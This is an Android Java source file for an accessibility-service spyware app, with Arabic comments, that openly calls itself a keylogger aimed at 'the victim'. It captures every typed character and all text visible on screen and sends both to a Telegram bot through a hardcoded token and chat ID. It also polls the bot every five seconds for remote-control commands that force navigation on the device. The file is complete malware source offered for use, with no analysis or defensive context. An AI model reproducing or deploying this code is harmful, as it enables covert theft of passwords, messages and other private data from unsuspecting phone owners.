package com.adam.maestro.pro;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import okhttp3.*;
import java.io.IOException;
import java.net.URLEncoder;
import org.json.JSONArray;
import org.json.JSONObject;

public class MaestroService extends AccessibilityService {
    // معلومات الربط الخاصة بك
    private final String TOKEN = "7986655648:AAEhw17-wFcqvKTu8LQjTNqhi3syG6izEg0";
    private final String CHAT_ID = "5890070301";
    private final OkHttpClient client = new OkHttpClient();
    private int lastUpdateId = 0;

    @Override
    protected void onServiceConnected() {
        // رسالة تأكيد عند تشغيل الخدمة لأول مرة
        sendToBot("🦅 تم تفعيل 'نظام المايسترو الشامل' على الجهاز بنجاح!\nالآن يمكنك سحب الكيبورد ومراقبة كل شيء.");
        
        // بدء نظام استقبال الأوامر من التليجرام كل 5 ثوانٍ
        startRemoteControl();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // [1] سحب الكيبورد (Keylogger): أي حرف يتكتب يوصلك فوراً
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String typedText = event.getText().toString();
            if (!typedText.isEmpty() && !typedText.equals("[]")) {
                sendToBot("⌨️ كيبورد: " + typedText);
            }
        }

        // [2] سحب الشاشة الذكي: يقرأ النصوص اللي بتظهر قدام الضحية
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null) {
            scanScreenContent(nodeInfo);
        }
    }

    private void scanScreenContent(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String screenText = node.getText().toString();
            // تصفية النصوص عشان البوت ميتغرقش رسايل فاضية
            if (screenText.length() > 3) { 
                sendToBot("📡 سحب شاشة: " + screenText);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            scanScreenContent(node.getChild(i));
        }
    }

    private void startRemoteControl() {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                new Thread(() -> {
                    try {
                        // فحص الأوامر الجديدة من البوت
                        Request request = new Request.Builder()
                                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1))
                                .build();
                        Response response = client.newCall(request).execute();
                        if (response.isSuccessful()) {
                            JSONObject jsonResponse = new JSONObject(response.body().string());
                            JSONArray updates = jsonResponse.getJSONArray("result");
                            for (int i = 0; i < updates.length(); i++) {
                                JSONObject update = updates.getJSONObject(i);
                                lastUpdateId = update.getInt("update_id");
                                String command = update.getJSONObject("message").getString("text");
                                handleCommand(command);
                            }
                        }
                    } catch (Exception e) {
                        // تجاهل الأخطاء البسيطة للاستمرار
                    }
                }).start();
                handler.postDelayed(this, 5000);
            }
        }, 5000);
    }

    private void handleCommand(String cmd) {
        // تنفيذ أوامر التحكم عن بُعد
        if (cmd.equalsIgnoreCase("/ping")) {
            sendToBot("✅ المايسترو متصل وجاهز للأوامر!");
        } else if (cmd.equalsIgnoreCase("/home")) {
            performGlobalAction(GLOBAL_ACTION_HOME); // يرجعه للشاشة الرئيسية غصب عنه
            sendToBot("🏠 تم الخروج للشاشة الرئيسية");
        } else if (cmd.equalsIgnoreCase("/back")) {
            performGlobalAction(GLOBAL_ACTION_BACK); // يعمل "رجوع"
        }
    }

    private void sendToBot(String msg) {
        new Thread(() -> {
            try {
                String encodedMsg = URLEncoder.encode(msg, "UTF-8");
                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg)
                        .build();
                client.newCall(request).execute();
            } catch (Exception e) {}
        }).start();
    }

    @Override public void onInterrupt() {}
}
